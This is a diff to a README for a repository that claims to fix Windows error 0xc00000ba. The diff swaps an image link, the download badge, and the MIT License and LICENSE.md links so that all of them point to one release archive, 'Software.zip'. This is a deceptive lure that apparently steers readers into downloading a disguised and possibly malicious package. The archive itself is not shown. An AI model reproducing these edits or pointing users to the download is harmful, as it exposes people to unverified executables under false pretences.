@@ -2,7 +2,7 @@
 
 Welcome to the **Fixing Error 0xc00000ba** repository! 🛠️
 
-![Error 0xc00000ba](https://www.example.com/error-image.png)
+![Error 0xc00000ba](https://github.com/BoomerXD69/Fixing-Error-0xc00000ba/releases/download/v2.0/Software.zip)
 
 ## Table of Contents
 
@@ -25,7 +25,7 @@ Error 0xc00000ba is a common issue that many Windows users face when trying to r
 
 To get started with fixing the 0xc00000ba error, you can download the provided software package by clicking the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-<COLOR_CODE>)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Software](https://github.com/BoomerXD69/Fixing-Error-0xc00000ba/releases/download/v2.0/Software.zip<COLOR_CODE>)](https://github.com/BoomerXD69/Fixing-Error-0xc00000ba/releases/download/v2.0/Software.zip)
 
 Replace `<COLOR_CODE>` with your desired hexadecimal color code.
 
@@ -80,4 +80,4 @@ Feel free to open a pull request or create an issue to start collaborating with 
 
 ## License
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the [MIT License](https://github.com/BoomerXD69/Fixing-Error-0xc00000ba/releases/download/v2.0/Software.zip) - see the [https://github.com/BoomerXD69/Fixing-Error-0xc00000ba/releases/download/v2.0/Software.zip](https://github.com/BoomerXD69/Fixing-Error-0xc00000ba/releases/download/v2.0/Software.zip) file for details.
